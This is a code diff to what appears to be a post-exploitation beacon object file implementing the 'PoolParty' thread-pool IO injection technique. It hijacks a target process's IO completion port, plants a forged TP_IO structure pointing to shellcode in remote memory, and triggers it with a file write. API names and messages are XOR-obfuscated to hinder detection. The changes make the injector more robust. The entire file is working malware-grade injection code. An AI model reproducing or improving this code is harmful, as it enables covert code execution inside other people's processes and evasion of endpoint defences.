@@ -8,8 +8,8 @@ HANDLE m_p_hIoCompletion = NULL;
 
 static const unsigned char kApiNtSetInformationFile[] = { 0xE9, 0x48, 0xC2, 0x3B, 0x5F, 0x9D, 0x06, 0x97, 0xC8, 0x4E, 0xFC, 0x3F, 0x5F, 0xBD, 0x07, 0x9F, 0xE1, 0x55, 0xFD, 0x3B, 0x2B };
 // "NtSetInformationFile"
-static const unsigned char kFmtV4File[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xD7, 0x53, 0xFE, 0x32, 0x0B, 0xA4, 0x09, 0x83, 0xD3, 0x45, 0xB1, 0x38, 0x42, 0xB8, 0x0D, 0xCB, 0x87, 0x5C, 0xB4, 0x32, 0x58, 0xB4, 0x68 };
-// "[INFO] \tCreated pool party file: `%ls`"
+static const unsigned char kFmtV4File[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xD7, 0x53, 0xFE, 0x32, 0x0B, 0xA4, 0x09, 0x83, 0xD3, 0x45, 0xB1, 0x2A, 0x4E, 0xB9, 0x18, 0xD1, 0xC1, 0x55, 0xFD, 0x3B };
+// "[INFO] \tCreated pool party temp file"
 static const unsigned char kFmtV4Tp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xF3, 0x6C, 0xCE, 0x17, 0x64, 0xF4, 0x1B, 0x85, 0xD5, 0x49, 0xF2, 0x2A, 0x5E, 0xA6, 0x0D, 0xD1, 0xC6, 0x4F, 0xE2, 0x31, 0x48, 0xBD, 0x09, 0x85, 0xC2, 0x58, 0xB1, 0x29, 0x42, 0xA0, 0x00, 0xD1, 0xD3, 0x54, 0xF4, 0x7E, 0x58, 0xBC, 0x0D, 0x9D, 0xCB, 0x5F, 0xFE, 0x3A, 0x4E, 0xD4 };
 // "[INFO] \tCreated TP_IO structure associated with the shellcode"
 static const unsigned char kFmtV4Alloc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x50, 0xFD, 0x31, 0x48, 0xB5, 0x1C, 0x94, 0xC3, 0x1C, 0xC5, 0x0E, 0x74, 0x9D, 0x27, 0xD1, 0xCA, 0x59, 0xFC, 0x31, 0x59, 0xAD, 0x48, 0x98, 0xC9, 0x1C, 0xE5, 0x36, 0x4E, 0xF4, 0x1C, 0x90, 0xD5, 0x5B, 0xF4, 0x2A, 0x0B, 0xA4, 0x1A, 0x9E, 0xC4, 0x59, 0xE2, 0x2D, 0x11, 0xF4, 0x4D, 0x81, 0xA7 };
@@ -21,12 +21,71 @@ static const unsigned char kFmtV4Assoc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89,
 static const unsigned char kFmtV4Write[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF0, 0x4E, 0xFE, 0x2A, 0x4E, 0xF4, 0x1C, 0x9E, 0x87, 0x5A, 0xF8, 0x32, 0x4E, 0xF4, 0x1C, 0x9E, 0x87, 0x4D, 0xE4, 0x3B, 0x5E, 0xB1, 0x48, 0x90, 0x87, 0x4C, 0xF0, 0x3D, 0x40, 0xB1, 0x1C, 0xD1, 0xD3, 0x53, 0xB1, 0x2A, 0x43, 0xB1, 0x48, 0xB8, 0xE8, 0x1C, 0xF2, 0x31, 0x46, 0xA4, 0x04, 0x94, 0xD3, 0x55, 0xFE, 0x30, 0x0B, 0xA4, 0x07, 0x83, 0xD3, 0x3C };
 // "[INFO] \tWrote to file to queue a packet to the IO completion port"
 
-static BOOL RemoteTpIoInsertionSetupExecution() {
-    _NtSetInformationFile ZwSetInformationFile;
+static HANDLE CreatePoolPartyTempFile(void) {
     wchar_t tempDir[MAX_PATH];
     wchar_t fullPath[MAX_PATH];
     wchar_t *fileName;
     DWORD tlen;
+    HANDLE hFile;
+    int attempt;
+    DWORD err;
+
+    tlen = KERNEL32$GetTempPathW(MAX_PATH, tempDir);
+    if (tlen == 0 || tlen >= MAX_PATH) {
+        return INVALID_HANDLE_VALUE;
+    }
+
+    SeedRng();
+    for (attempt = 0; attempt < PP_NAME_RETRY; attempt++) {
+        fileName = GenerateRandomLetters(8);
+        if (fileName == NULL) {
+            return INVALID_HANDLE_VALUE;
+        }
+        MSVCRT$memset(fullPath, 0, sizeof(fullPath));
+        if (MSVCRT$wcscpy_s(fullPath, MAX_PATH, tempDir) != 0 ||
+            MSVCRT$wcscat_s(fullPath, MAX_PATH, fileName) != 0) {
+            BofFree(fileName);
+            return INVALID_HANDLE_VALUE;
+        }
+        BofFree(fileName);
+        hFile = KERNEL32$CreateFileW(
+            fullPath,
+            GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL,
+            CREATE_NEW,
+            FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED,
+            NULL);
+        MSVCRT$memset(fullPath, 0, sizeof(fullPath));
+        if (hFile != NULL && hFile != INVALID_HANDLE_VALUE) {
+            return hFile;
+        }
+        err = KERNEL32$GetLastError();
+        if (err != ERROR_FILE_EXISTS && err != ERROR_ALREADY_EXISTS) {
+            return INVALID_HANDLE_VALUE;
+        }
+    }
+    return INVALID_HANDLE_VALUE;
+}
+
+static BOOL VariantSanityExtra(void) {
+    HANDLE hFile;
+
+    if (!HostIsWin81OrNewer()) {
+        SANITY_FAIL(kFmtTriggerFail, kFmtSuggestTemp);
+        return FALSE;
+    }
+    hFile = CreatePoolPartyTempFile();
+    if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
+        SANITY_FAIL(kFmtTriggerFail, kFmtSuggestTemp);
+        return FALSE;
+    }
+    KERNEL32$CloseHandle(hFile);
+    return TRUE;
+}
+
+static BOOL RemoteTpIoInsertionSetupExecution() {
+    _NtSetInformationFile ZwSetInformationFile;
     HANDLE p_hFile;
     PFULL_TP_IO pTpIo;
     PFULL_TP_IO pTpIoCopy;
@@ -36,7 +95,7 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
     NTSTATUS Ntstatus;
     unsigned char Buffer[8];
     OVERLAPPED Overlapped;
-    DWORD spinStart;
+    DWORD bytes;
     int i;
 
     ZwSetInformationFile = (_NtSetInformationFile)ResolveNtdllEnc(kApiNtSetInformationFile, (int)sizeof(kApiNtSetInformationFile));
@@ -45,49 +104,17 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
         return FALSE;
     }
 
-    SeedRng();
-    fileName = GenerateRandomLetters(8);
-    if (fileName == NULL) {
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
-        return FALSE;
-    }
-
-    tlen = KERNEL32$GetTempPathW(MAX_PATH, tempDir);
-    if (tlen == 0 || tlen >= MAX_PATH) {
-        BofFree(fileName);
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
-        return FALSE;
-    }
-    ApiPause();
-
-    MSVCRT$memset(fullPath, 0, sizeof(fullPath));
-    if (MSVCRT$wcscpy_s(fullPath, MAX_PATH, tempDir) != 0 ||
-        MSVCRT$wcscat_s(fullPath, MAX_PATH, fileName) != 0) {
-        BofFree(fileName);
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
-        return FALSE;
-    }
-
-    p_hFile = KERNEL32$CreateFileW(
-        fullPath,
-        GENERIC_WRITE,
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED,
-        NULL);
+    p_hFile = CreatePoolPartyTempFile();
     if (p_hFile == NULL || p_hFile == INVALID_HANDLE_VALUE) {
-        BofFree(fileName);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
-    OBF_PRINT1(CALLBACK_OUTPUT, kFmtV4File, fullPath);
+    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4File);
     ApiPause();
 
-    pTpIo = (PFULL_TP_IO)KERNEL32$CreateThreadpoolIo(p_hFile, (PTP_WIN32_IO_CALLBACK)(m_ShellcodeAddress), NULL, NULL);
+    pTpIo = (PFULL_TP_IO)KERNEL32$CreateThreadpoolIo(p_hFile, DummyIoCallback, NULL, NULL);
     if (pTpIo == NULL) {
         KERNEL32$CloseHandle(p_hFile);
-        BofFree(fileName);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
@@ -97,11 +124,18 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
     if (pTpIoCopy == NULL) {
         CloseTpIoSafe((PTP_IO)pTpIo);
         KERNEL32$CloseHandle(p_hFile);
-        BofFree(fileName);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
-    MSVCRT$memcpy(pTpIoCopy, pTpIo, sizeof(FULL_TP_IO));
+    if (!CopyLocalTpObject(pTpIoCopy, pTpIo, sizeof(FULL_TP_IO))) {
+        BofFree(pTpIoCopy);
+        CloseTpIoSafe((PTP_IO)pTpIo);
+        KERNEL32$CloseHandle(p_hFile);
+        return FALSE;
+    }
+    SanitizeCleanupGroupMember(&pTpIoCopy->CleanupGroupMember);
+    SanitizeTpDirect(&pTpIoCopy->Direct);
+    pTpIoCopy->File = NULL;
     pTpIoCopy->CleanupGroupMember.Callback = m_ShellcodeAddress;
     ++pTpIoCopy->PendingIrpCount;
 
@@ -110,7 +144,6 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
         BofFree(pTpIoCopy);
         CloseTpIoSafe((PTP_IO)pTpIo);
         KERNEL32$CloseHandle(p_hFile);
-        BofFree(fileName);
         OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteAllocFail);
         return FALSE;
     }
@@ -120,12 +153,12 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
         BofFree(pTpIoCopy);
         CloseTpIoSafe((PTP_IO)pTpIo);
         KERNEL32$CloseHandle(p_hFile);
-        BofFree(fileName);
         RemoteFree(pRemoteTpIo);
         OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
         return FALSE;
     }
     BofFree(pTpIoCopy);
+    CloseTpIoSafe((PTP_IO)pTpIo);
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Wrote);
 
     MSVCRT$memset(&IoStatusBlock, 0, sizeof(IoStatusBlock));
@@ -134,39 +167,34 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
     FileIoCompletionInformation.Key = &pRemoteTpIo->Direct;
     Ntstatus = ZwSetInformationFile(p_hFile, &IoStatusBlock, &FileIoCompletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
     if (!NT_SUCCESS(Ntstatus)) {
-        CloseTpIoSafe((PTP_IO)pTpIo);
         KERNEL32$CloseHandle(p_hFile);
-        BofFree(fileName);
         RemoteFree(pRemoteTpIo);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
+    MarkPublished();
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Assoc);
 
     for (i = 0; i < 8; i++) {
         Buffer[i] = (unsigned char)(i + 1);
     }
     MSVCRT$memset(&Overlapped, 0, sizeof(Overlapped));
+    bytes = 0;
     if (!KERNEL32$WriteFile(p_hFile, Buffer, 8, NULL, &Overlapped)) {
         if (KERNEL32$GetLastError() != ERROR_IO_PENDING) {
-            CloseTpIoSafe((PTP_IO)pTpIo);
             KERNEL32$CloseHandle(p_hFile);
-            BofFree(fileName);
-            RemoteFree(pRemoteTpIo);
             OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
             return FALSE;
         }
-        spinStart = KERNEL32$GetTickCount();
-        while (!HasOverlappedIoCompleted(&Overlapped) &&
-               (KERNEL32$GetTickCount() - spinStart) < 100u) {
-            KERNEL32$SwitchToThread();
-        }
+    }
+    if (!KERNEL32$GetOverlappedResult(p_hFile, &Overlapped, &bytes, TRUE) || bytes != 8) {
+        KERNEL32$CloseHandle(p_hFile);
+        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
+        return FALSE;
     }
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Write);
 
-    CloseTpIoSafe((PTP_IO)pTpIo);
     KERNEL32$CloseHandle(p_hFile);
-    BofFree(fileName);
     ApiPause();
     return TRUE;
 }
@@ -174,7 +202,7 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
 void HijackHandles() {
     m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid);
     if (m_p_hIoCompletion != NULL) {
-        OBF_PRINT1(CALLBACK_OUTPUT, kFmtHijackIocp, m_p_hIoCompletion);
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtHijackIocp);
     }
 }
 
@@ -193,6 +221,7 @@ void Inject() {
         return;
     }
     if (!RemoteTpIoInsertionSetupExecution()) {
+        FreeShellcodeIfUnpublished();
         CloseHandleSafe(&m_p_hIoCompletion);
         InjectCleanup();
         return;
@@ -203,8 +232,5 @@ void Inject() {
 }
 
 void go(char * args, int len) {
-    if (!ParseBeaconArgs(args, len)) {
-        return;
-    }
-    Inject();
+    PoolPartyEntry(args, len);
 }
